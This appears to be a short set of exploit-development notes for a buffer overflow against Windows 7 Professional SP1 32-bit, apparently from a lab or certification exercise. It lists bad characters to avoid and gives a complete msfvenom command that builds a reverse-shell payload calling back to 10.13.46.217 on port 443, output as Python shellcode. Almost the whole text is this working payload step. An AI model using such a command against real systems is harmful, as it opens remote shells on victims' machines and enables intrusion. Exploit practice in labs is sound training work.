

Created for Windows 7 Professional SP1 32bits

Badchars: \x00\x8c\xae\xbe\xfb

Msfvenom: msfvenom -p windows/shell_reverse_tcp lhost=10.13.46.217 lport=443 exitfunc=thread -b "\x00\x8c\xae\xbe\xfb" -v esp -f python
